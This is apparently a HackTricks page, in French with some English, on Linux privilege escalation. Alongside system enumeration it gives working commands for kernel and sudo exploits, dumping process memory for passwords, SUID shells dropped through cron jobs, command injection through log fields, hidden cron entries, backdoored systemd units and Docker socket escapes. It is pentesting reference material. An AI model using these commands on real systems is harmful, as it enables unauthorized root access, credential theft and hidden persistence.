# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Infos sur l'OS

Commençons par obtenir des informations sur l'OS en cours d'exécution.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si vous **have write permissions on any folder inside the `PATH`** variable, vous pourriez être capable de hijack certaines libraries ou binaries:
```bash
echo $PATH
```
### Infos d'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Vérifiez la version du kernel et s'il existe un exploit pouvant être utilisé pour escalader les privilèges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de noyaux vulnérables et quelques **compiled exploits** déjà disponibles ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D'autres sites où vous pouvez trouver des **compiled exploits** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de noyau vulnérables depuis ce site, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Outils pouvant aider à rechercher des exploits du kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (exécuter DANS la victime, vérifie uniquement les exploits pour kernel 2.x)

Toujours **recherchez la version du kernel sur Google**, il se peut que votre version du kernel soit mentionnée dans un exploit et ainsi vous serez sûr que cet exploit est valide.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

D'après les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent à des utilisateurs locaux non privilégiés d'élever leurs privilèges au niveau root via l'option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'[vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Par @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg : échec de la vérification de la signature

Consultez **smasher2 box of HTB** pour un **exemple** de la façon dont cette vuln peut être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si vous êtes à l'intérieur d'un conteneur docker, vous pouvez essayer d'en sortir :


{{#ref}}
docker-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté et ce qui ne l'est pas**, où et pourquoi. Si quelque chose n'est pas monté, vous pouvez essayer de le monter et vérifier s'il contient des informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez aussi si **un compilateur est installé**. Cela est utile si vous devez utiliser un kernel exploit car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et des services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalating privileges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez aussi utiliser **openVAS** pour vérifier les logiciels obsolètes et vulnérables installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations principalement inutiles ; il est donc recommandé d'utiliser des applications comme OpenVAS ou équivalentes qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus_

## Processus

Examinez **quels processus** sont exécutés et vérifiez si un processus a **plus de privilèges que nécessaire** (par exemple un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence possible de [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** détecte ces cas en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également vos privilèges sur les binaires des processus — vous pourriez en écraser un appartenant à un autre.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont réunies.

### Mémoire des processus

Certains services d'un serveur sauvegardent des **identifiants en clair dans la mémoire**.\
Normalement vous aurez besoin des **privileges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs ; c'est donc généralement plus utile quand vous êtes déjà root et voulez découvrir d'autres identifiants.\
Cependant, souvenez-vous qu'**en tant qu'utilisateur ordinaire vous pouvez lire la mémoire des processus que vous possédez**.

> [!WARNING]
> Notez qu'aujourd'hui la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper d'autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la manière classique dont ptrace fonctionnait.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: seul l'admin peut utiliser ptrace, car cela requiert la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: aucun processus ne peut être tracé avec ptrace. Une fois défini, un reboot est nécessaire pour réactiver ptrace.

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple) vous pourriez récupérer le Heap et y rechercher des identifiants.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un PID donné, **maps montre comment la mémoire est mappée dans l'espace d'adresses virtuel de ce processus** ; il montre aussi les **permissions de chaque région mappée**. Le pseudo-fichier **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** et leurs décalages. Nous utilisons cette information pour **seek into the mem file and dump all readable regions** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fournit un accès à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adresses virtuelles du kernel est accessible via /dev/kmem.\
Typiquement, `/dev/mem` n'est lisible que par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinvention pour Linux de l'outil classique ProcDump de la suite Sysinternals pour Windows. Disponible sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Pour dump la mémoire d'un processus vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et dump le processus dont vous êtes propriétaire
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root requis)

### Credentials from Process Memory

#### Manual example

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dump le process (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d'un process) et rechercher des credentials dans la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de sudo) | sshd:                |

#### Regexes de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron jobs

### Crontab UI (alseambusher) s'exécutant en tant que root – planificateur web privesc

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et est lié uniquement à loopback, vous pouvez quand même y accéder via SSH local port-forwarding et créer une tâche privilégiée pour escalader.

Chaîne typique
- Découvrir un port accessible uniquement via loopback (p.ex., 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver des identifiants dans des artefacts opérationnels :
- Sauvegardes/scripts avec `zip -P <password>`
- unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel et connexion:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer un job à privilèges élevés et l'exécuter immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- Ne lancez pas Crontab UI en tant que root ; restreignez-le à un utilisateur dédié avec des permissions minimales
- Bind to localhost et, en plus, restreignez l'accès via firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d'intégrer des secrets dans les unit files ; utilisez des secret stores ou un EnvironmentFile accessible seulement par root
- Activez l'audit/le logging pour les exécutions de jobs à la demande

Vérifiez si un job planifié est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (wildcard vuln ? pouvez-vous modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire que root utilise ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Chemin Cron

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez que l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si dans ce crontab l'utilisateur root tente d'exécuter une commande ou un script sans définir le PATH. Par exemple: _\* \* \* \* root overwrite.sh_\
Ensuite, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient un “**\***” dans une commande, vous pourriez exploiter cela pour provoquer des comportements inattendus (comme privesc). Exemple:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Lisez la page suivante pour plus d'astuces d'exploitation de wildcard :


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash réalise parameter expansion et command substitution avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en root lit des champs de logs non fiables et les insère dans un contexte arithmétique, un attaquant peut injecter une command substitution $(...) qui s'exécute en root lorsque le cron tourne.

- Pourquoi ça marche : Dans Bash, les expansions se produisent dans cet ordre : parameter/variable expansion, command substitution, arithmetic expansion, puis word splitting et pathname expansion. Ainsi une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (exécution de la commande), puis le `0` numérique restant est utilisé pour l'arithmétique, de sorte que le script continue sans erreurs.

- Exemple vulnérable typique :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Obtenez du texte contrôlé par l'attaquant écrit dans le log analysé de sorte que le champ apparemment numérique contienne une command substitution et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou redirigez-la) afin que l'arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire où vous avez un accès complet**, il peut être utile de supprimer ce dossier et de **créer un dossier symlink pointant vers un autre** servant un script contrôlé par vous
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **surveiller toutes les 0.1s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Cron jobs invisibles

Il est possible de créer un cronjob **en mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et le cron job fonctionnera. Exemple (notez le caractère retour chariot):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Fichiers _.service_ modifiables

Vérifiez si vous pouvez écrire un fichier `.service` ; si c'est le cas, vous **pourriez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (il se peut que vous deviez attendre que la machine soit redémarrée).\
Par exemple, créez votre backdoor à l'intérieur du fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service modifiables

Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y placer des backdoors de sorte que, lorsque les services seront réexécutés, les backdoors seront exécutés.

### systemd PATH - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous découvrez que vous pouvez **write** dans n'importe lequel des dossiers du chemin, vous pourriez être en mesure de **escalate privileges**. Il faut rechercher les **relative paths being used on service configurations** files comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** à l'intérieur du dossier PATH de systemd sur lequel vous pouvez écrire, et lorsque le service est invité à exécuter l'action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

Les **Timers** sont des unit files systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron car ils intègrent la prise en charge des événements calendaires et des événements monotoniques, et peuvent s'exécuter de façon asynchrone.

Vous pouvez énumérer tous les timers avec :
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez lui faire exécuter des unités existantes de systemd.unit (comme une `.service` ou une `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est l'unité :

> L'unité à activer lorsque ce timer expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut correspond à un service ayant le même nom que l'unité timer, à l'exception du suffixe. (Voir ci‑dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité timer soient identiques, à l'exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devrez :

- Trouver une unité systemd (comme une `.service`) qui **exécute un binaire écrivable**
- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous avez des **privilèges d'écriture** sur le **systemd PATH** (pour usurper cet exécutable)

**En savoir plus sur les timers avec `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer, vous avez besoin des privilèges root et devez exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Remarque : le **timer** est **activé** en créant un symlink vers lui dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou entre machines différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication inter-ordinateur et sont configurés via des fichiers `.socket`.

Les sockets peuvent être configurées à l'aide de fichiers `.socket`.

**En savoir plus sur les sockets avec `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options diffèrent mais, en résumé, servent à **indiquer où il va écouter** le socket (le chemin du fichier de socket AF_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept` : Prend un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **false**, tous les sockets à l'écoute sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut false**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux daemons uniquement d'une manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier jeton de la ligne de commande doit être un nom de fichier absolu, suivi des arguments pour le processus.
- `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **fermés** et supprimés, respectivement.
- `Service` : Spécifie le nom de l'unité **service** **à activer** sur le **trafic entrant**. Cette option n'est autorisée que pour les sockets avec Accept=no. Par défaut, elle pointe vers le service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Writable .socket files

Si vous trouvez un fichier `.socket` **inscriptible**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la backdoor sera exécutée avant que le socket ne soit créé. Par conséquent, vous devrez **probablement attendre le redémarrage de la machine.**\
_Notez que le système doit utiliser cette configuration de fichier socket sinon la backdoor ne sera pas exécutée_

### Writable sockets

Si vous **identifiez un socket inscriptible** (_ici il s'agit de Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Notez qu'il peut y avoir des **sockets listening for HTTP** requests (_je ne parle pas des .socket files mais des fichiers agissant comme des unix sockets_). Vous pouvez vérifier cela avec:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si le socket **répond à une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploit une vulnérabilité**.

### Writable Docker Socket

Le Docker socket, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est writable par l'utilisateur `root` et les membres du groupe `docker`. Posséder write access à ce socket peut conduire à une privilege escalation. Voici un aperçu de la façon dont cela peut être fait et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Privilege Escalation with Docker CLI**

Si vous avez write access au Docker socket, vous pouvez escalate privileges en utilisant les commandes suivantes:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes permettent d'exécuter un container avec un accès root au système de fichiers de l'hôte.

#### **Utilisation directe de l'API Docker**

Dans les cas où le Docker CLI n'est pas disponible, le docker socket peut toujours être manipulé en utilisant l'API Docker et des commandes `curl`.

1.  **List Docker Images:** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envoyer une requête pour créer un container qui monte le répertoire racine du système hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le container nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Utilisez `socat` pour établir une connexion vers le container, permettant l'exécution de commandes à l'intérieur de celui-ci.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir établi la connexion `socat`, vous pouvez exécuter des commandes directement dans le container avec un accès root au système de fichiers de l'hôte.

### Autres

Notez que si vous avez les permissions d'écriture sur le docker socket parce que vous êtes **inside the group `docker`** vous avez [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

